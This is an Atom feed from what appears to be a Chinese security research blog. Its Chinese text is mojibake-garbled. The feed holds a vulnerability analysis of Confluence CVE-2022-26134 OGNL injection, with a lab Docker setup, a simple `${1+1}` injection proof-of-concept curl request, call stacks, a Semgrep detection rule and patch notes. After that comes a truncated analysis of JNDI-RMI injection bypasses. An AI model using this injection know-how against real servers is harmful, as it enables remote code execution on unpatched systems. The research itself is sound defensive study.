<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0d9&#39;s blog</title>
  
  
  <link href="http://m0d9.me/atom.xml" rel="self"/>
  
  <link href="http://m0d9.me/"/>
  <updated>2022-06-29T09:53:28.209Z</updated>
  <id>http://m0d9.me/</id>
  
  <author>
    <name>m0d9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Confluence CVE-2022-26134 OGNL åˆ†æ</title>
    <link href="http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/</id>
    <published>2022-06-10T06:20:00.000Z</published>
    <updated>2022-06-29T09:53:28.209Z</updated>
    
    <content type="html"><![CDATA[<!-- æ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚--><p>å‘ç°åŠå¹´æ²¡å†™æ–‡ç« äº†ã€‚ã€‚ã€‚</p><h2 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h2><p>PğŸ®çš„Vulhub æœ‰é•œåƒäº†ï¼Œä¸è¿‡è°ƒè¯•æ¥å£æ²¡æœ‰å¼€å‡ºæ¥ï¼Œè¿™é‡Œç¨å¾®è¡¥å……ä¸‹ã€‚</p><p>åœ¨vulhub/confluence/CVE2022-26134 ç›®å½•ä¸‹</p><ol><li>æ–°å»ºDockerfile</li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/confluence:<span class="number">7.13</span>.<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">&quot;106 iCATALINA_OPTS=\&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&#123;CATALINA_OPTS\&#125;\&quot;&quot;</span> -i /opt/atlassian/confluence/bin/setenv.sh</span></span><br></pre></td></tr></table></figure><ol start="2"><li>æ›´æ–°docker-compose.yml</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span> <span class="string">.</span></span><br><span class="line"><span class="comment"># image: vulhub/confluence:7.13.6</span></span><br><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h2><p>Y4er å¸ˆå‚…å…³äºæ¼æ´çš„æ€»ç»“å¾—æŒºå¥½çš„ï¼Œæ¼æ´å¤ç°è¿™å—å·²ç»æ²¡ä»€ä¹ˆå¥½è®²çš„äº†ã€‚</p><ul><li>æ¼æ´çš„è°ƒç”¨æ ˆ</li><li>é»‘ç™½åå•çš„ç»•è¿‡</li></ul><p><code>POC: curl -v &quot;http://192.168.1.112:8090/%24%7B1+1%7D/&quot;</code></p><p>æœ€ç»ˆçš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">findValue:129, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)</span><br><span class="line">execute:95, ActionChainResult (com.opensymphony.xwork)</span><br><span class="line">executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invoke:187, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [3]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:27, LastModifiedInterceptor (com.atlassian.confluence.core.actions)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:44, ConfluenceAutowireInterceptor (com.atlassian.confluence.core)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [2]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invokeAndHandleExceptions:61, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">invokeInTransaction:51, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">intercept:50, XWorkTransactionInterceptor (com.atlassian.xwork.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:61, SetupIncompleteInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:26, SecurityHeadersInterceptor (com.atlassian.confluence.security.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [1]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">execute:115, DefaultActionProxy (com.opensymphony.xwork)</span><br><span class="line">serviceAction:56, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)</span><br><span class="line">service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br></pre></td></tr></table></figure><h2 id="0x03-æ€è·¯é€†å‘"><a href="#0x03-æ€è·¯é€†å‘" class="headerlink" title="0x03 æ€è·¯é€†å‘"></a>0x03 æ€è·¯é€†å‘</h2><p>å…³äºæ¼æ´å¦‚ä½•å‘ç°çš„ï¼Œä¸ªäººç†è§£å¯ä»¥æ‹†åˆ†æˆ3ä¸ªé˜¶æ®µ</p><ol><li>å¦‚ä½•å®šä½åˆ°å»æŒ–confluence</li><li>å¦‚ä½•å‘ç°ognlæ”»å‡»é¢ï¼Œä¹Ÿå³sinkç‚¹</li><li>å¦‚ä½•ä»sinkç‚¹æ¨å¯¼å‡ºsourceåŠpath</li></ol><p>è¿™äº›éƒ½æ˜¯å¾ˆæœ‰æ„æ€çš„ç‚¹ï¼Œå€¼å¾—æ€è€ƒã€‚è¿™é‡Œä¹Ÿåªå°è¯•é€†å‘åˆ†ææ­¥éª¤3çš„æ€è·¯ï¼Œæ­¥éª¤1ã€2å¤ªè¿‡å®½æ³›äº†æœ‰æ—¶é—´å†åšæ¢è®¨ã€‚</p><h3 id="sink-åˆ°source"><a href="#sink-åˆ°source" class="headerlink" title="sink åˆ°source"></a>sink åˆ°source</h3><p>sink ç‚¹å…¶å®å¾ˆæ˜æ˜¾ï¼Œognl.getValueï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå¦‚ä½•æ‰¾åˆ°å®Œæ•´çš„è§¦å‘é“¾ï¼Ÿ</p><p>sourceç‚¹åœ¨javax.servlet.http.HttpServlet#serviceï¼Œéœ€è¦å¯¹confluence ç»“æ„æœ‰ä¸€å®šäº†è§£ï¼Œæˆ–è€…è¦è°ƒè¯•ä¸‹å†å²çš„æ¼æ´ï¼Œåº”è¯¥èƒ½å®šä½åˆ°è¿™é‡Œã€‚</p><p>å¦‚ä½•æ‰¾å‡ºä¸­é—´çš„é“¾ï¼Œconfluenceæ²¡æœ‰æºç ï¼Œæ‰€ä»¥tabby æˆ–è€… ByteCodeDLï¼Ÿ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar build&#x2F;libs&#x2F;tabby-1.1.0.RELEASE.jar ..&#x2F;confluence&#x2F;atlassian-confluence-7.13.6&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; --isJDKProcess</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; confluence CVE-2022-26134</span><br><span class="line">match (source:Method &#123;NAME:&quot;service&quot;&#125;) where source.CLASSNAME &#x3D;~ &quot;.*ServletDispatcher&quot;</span><br><span class="line">match (sink:Method &#123;NAME:&quot;translateVariables&quot;, CLASSNAME:&quot;com.opensymphony.xwork.util.TextParseUtil&quot;&#125;) </span><br><span class="line">call apoc.algo.allSimplePaths(source,sink,&quot;&gt;CALL|ALIAS&quot;,9) yield path </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-214.png" alt="upload successful"></p><p>Y4å¸ˆå‚…æåˆ°çš„ä¸€äº›å…¶ä»–çš„ *Result#executeï¼Œå¯ä»¥çœ‹åˆ°éƒ¨åˆ†ä¹Ÿåœ¨è·¯å¾„é‡Œé¢ã€‚</p><h3 id="sink-ç‚¹çš„å®šä½"><a href="#sink-ç‚¹çš„å®šä½" class="headerlink" title="sink ç‚¹çš„å®šä½"></a>sink ç‚¹çš„å®šä½</h3><p>Semgrep å¯¹äºæ‰¾sinkç‚¹ï¼Œå’Œæ­£åˆ™ç›¸æ¯”æœ‰ä¸€äº›ä¼˜åŠ¿ï¼Œä¸è¿‡ç›®å‰è§„åˆ™ä¹Ÿä¸å…¨ã€‚</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">pattern-either:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.getValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.setValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">$X.translateVariables(...</span> <span class="string">,</span> <span class="string">...)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semgrep --config=java/lang/security/audit/ognl-injection2.yaml ~/study/java/confluence/confluence-home/jars/</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-218.png" alt="upload successful"></p><p>å¯¹äºjarç±»å‹ï¼Œå¦‚æœè¦å®ç°å®Œå…¨è‡ªåŠ¨åŒ–è¿˜æ˜¯æ¯”è¾ƒå›°éš¾ã€‚åç¼–è¯‘ã€è‡ªåŠ¨åŒ–è¿è¡Œsemgrepè§„åˆ™ã€å†ä»sinkç‚¹å‡ºå‘ç”¨Tabbyæ‰¾è·¯å¾„ã€‚ç›®å‰ä¹Ÿæ²¡æœ‰å¥½çš„æ€è·¯ï¼Œå­¦ä¹ ã€Šè½¯ä»¶åˆ†æã€‹å§ã€‚</p><h2 id="0x04-è¡¥ä¸åˆ†æ"><a href="#0x04-è¡¥ä¸åˆ†æ" class="headerlink" title="0x04 è¡¥ä¸åˆ†æ"></a>0x04 è¡¥ä¸åˆ†æ</h2><p><img src="/images/pasted-215.png" alt="upload successful"><br>åªæ˜¯ä¿®äº†ActionChainResult ä¸­çš„translateVariablesã€‚ä½†æ˜¯å…¶ä»–çš„Ognl ç‚¹ä¹Ÿæ²¡æ‰¾åˆ°è§¦å‘é“¾ã€‚</p><h2 id="0x05-å°ç»“"><a href="#0x05-å°ç»“" class="headerlink" title="0x05 å°ç»“"></a>0x05 å°ç»“</h2><p>æœ¬æ–‡ç®€ç•¥çš„è·Ÿè¸ªäº†Confluence CVE-2022-26134 OGNLçš„æ¼æ´è°ƒç”¨æµç¨‹ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ¢ç´¢å…¶OGNLè°ƒç”¨é“¾çš„å‘ç°æ€è·¯ã€‚åˆ†æäº†è¡¥ä¸ï¼Œå°è¯•æŒ–æ˜å…¶ä»–çš„è§¦å‘é“¾ï¼Œä½†æ˜¯æ— æœã€‚åŸºæœ¬å†…å®¹Y4å¸ˆå‚…çš„æ–‡ç« åŸºæœ¬éƒ½æœ‰äº†ï¼Œæœ¬æ–‡æ²¡ä»€ä¹ˆæ–°çš„ä¸œè¥¿ã€‚</p><p>æ€»çš„æ¥è¯´è¿™ä¸ªæ´åŸç†å¹¶ä¸éš¾ï¼Œst2 çš„ognlä¹Ÿæ˜¯ç»å…¸çš„æ¼æ´äº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆæ˜¯é»‘äº§èµ°åœ¨äº†æŠ€æœ¯å‰æ²¿ï¼Ÿçº¯æŠ€æœ¯è€Œè¨€ï¼ŒåŸç†ä¸éš¾ï¼Œä½†æ˜¯è¾ƒéš¾è‡ªåŠ¨åŒ–ï¼Œä¸»åŠ¨æŒ–æ˜ä¹Ÿéœ€è¦ä¸€å®šçš„æ¼æ´å†å²çŸ¥è¯†ã€‚</p><p>è€æ ·å­ç•™ä¸ªå‘å§</p><ol><li>åªæ ¹æ®è¡¥ä¸ï¼Œèƒ½å¤Ÿç‹¬ç«‹åˆ†æå‡ºPOCå—ï¼ŸPSï¼šä¸šå†…è°æœ€å…ˆæå‡ºpocçš„</li><li>æ€ä¹ˆä¼šæƒ³åˆ°åˆ°å»æŒ–confluenceçš„ï¼Ÿ</li><li>å¦‚ä½•å‘ç°OGNLæ”»å‡»é¢ï¼Ÿ</li></ol><p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p><h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><ul><li>[1]<a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134">Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134) (by:phith0n)</a></li><li>[2]<a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/">CVE-2022-26134 Confluence Server Data Center OGNL RCE (by:Y4er)</a></li><li>[3]<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">Confluence Security Advisory 2022-06-02</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- æ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚--&gt;

&lt;p&gt;å‘ç°åŠå¹´æ²¡å†™æ–‡ç« äº†ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x01-ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#0x01-ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;0x01 ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;0x01 ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;Pï¿½</summary>
      
    
    
    
    <category term="Java" scheme="http://m0d9.me/categories/Java/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Confluence" scheme="http://m0d9.me/tags/Confluence/"/>
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
  </entry>
  
  <entry>
    <title>JNDI-RMI æ³¨å…¥çš„EL ç»•è¿‡æ€è·¯åˆ†æ</title>
    <link href="http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2021-12-17T06:11:00.000Z</published>
    <updated>2022-03-18T06:26:23.093Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/pasted-203.png" alt="upload successful"></p><p>ä¸Šé¢çš„JNDI æ³¨å…¥çš„JDK ç‰ˆæœ¬é™åˆ¶å·²ç»è€³ç†Ÿèƒ½è¯¦äº†ï¼Œé’ˆå¯¹JNDI-RMI çš„tomcat EL ç»•è¿‡å§¿åŠ¿ä¹Ÿè¢«ç»å¸¸æèµ·ï¼Œæœ¬æ–‡å°è¯•å›æº¯è¿™ä¸€å§¿åŠ¿çš„å‘ç°è¿‡ç¨‹ã€‚</p><h2 id="JNDI-RMI-æ³¨å…¥"><a href="#JNDI-RMI-æ³¨å…¥" class="headerlink" title="JNDI-RMI æ³¨å…¥"></a>JNDI-RMI æ³¨å…¥</h2><h3 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h3><p>å¿…é¡»äº†è§£ä¸¤ä¸ªé‡è¦çš„ç±»</p><ul><li>com.sun.jndi.rmi.registry.RegistryContextï¼š JNDI-RMIæ¥å£</li><li>java.rmi.registry.Registryï¼š RMI æ¥å£</li></ul><p>é€šå¸¸æ”»å‡»åœºæ™¯ä¸‹ï¼ŒRegistryæ˜¯ä½œä¸ºRMIæœåŠ¡ç«¯ï¼ŒRegistryContextæ˜¯ä½œä¸ºæ”»å‡»çš„clientç«¯ï¼Œä¹Ÿå°±æ˜¯vulnã€‚</p><a id="more"></a><h2 id="ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext-lookup"><a href="#ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext-lookup" class="headerlink" title="ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext#lookup"></a>ä½ç‰ˆæœ¬æ³¨å…¥è¿‡ç¨‹ï¼šRegistryContext#lookup</h2><p>éƒ½åœ¨RegistryContext#lookup é‡Œé¢ï¼Œå¸¸è§çš„å¦‚ ctx.lookup(â€œrmi://xxx/Exploitâ€)ï¼Œè¢«æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹</p><ul><li>registry#lookup è·å–è¿œç¨‹æ¶æ„server ç»‘å®šçš„Remote ç±»</li><li>registry#decodeObject è°ƒç”¨è¯¥Remoteç±» çš„getObjectInstance å®ä¾‹åŒ–è¯¥ç±»</li></ul><p>com.sun.jndi.rmi.registry.RegistryContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> Registry registry;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           Remote var2;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">               <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">           <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br></pre></td></tr></table></figure><p>javax.naming.spi.NamingManager#getObjectInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                          Hashtable&lt;?,?&gt; environment)</span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">        ObjectFactoryBuilder builder = getObjectFactoryBuilder();</span><br><span class="line">        <span class="keyword">if</span> (builder != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// builder must return non-null factory</span></span><br><span class="line">            factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">                environment);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use reference if possible</span></span><br><span class="line">        Reference ref = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object answer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String f = ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try using any specified factories</span></span><br><span class="line">        answer =</span><br><span class="line">            createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">        <span class="keyword">return</span> (answer != <span class="keyword">null</span>) ? answer : refInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ­¤å¤„ï¼Œå¦‚æœæ˜¯Reference å¯¹è±¡ï¼Œåˆ™ä¼šgetObjectFactoryFromReference - getObjectInstance è¿›è¡Œå®ä¾‹åŒ–ï¼Œä¹Ÿå°±æ˜¯åŸæœ¬çš„JNDI-RMIåˆ©ç”¨æµç¨‹ã€‚</p><h3 id="é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext-decodeObject"><a href="#é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext-decodeObject" class="headerlink" title="é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext#decodeObject"></a>é«˜ç‰ˆæœ¬é™åˆ¶ï¼šRegistryContext#decodeObject</h3><blockquote><p>åœ¨JDK 6u132, JDK 7u122, JDK 8u113 ä¸­Javaæå‡äº†JNDI é™åˆ¶äº†Naming/DirectoryæœåŠ¡ä¸­JNDI Referenceè¿œç¨‹åŠ è½½Object Factoryç±»çš„ç‰¹æ€§ã€‚ç³»ç»Ÿå±æ€§ com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚å¦‚æœéœ€è¦å¼€å¯ RMI Registry æˆ–è€… COS Naming Service Providerçš„è¿œç¨‹ç±»åŠ è½½åŠŸèƒ½ï¼Œéœ€è¦å°†å‰é¢è¯´çš„ä¸¤ä¸ªå±æ€§å€¼è®¾ç½®ä¸ºtrueã€‚</p></blockquote><p>å®ç°trustURLCodebase çš„é€»è¾‘åœ¨decodeObject ä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to 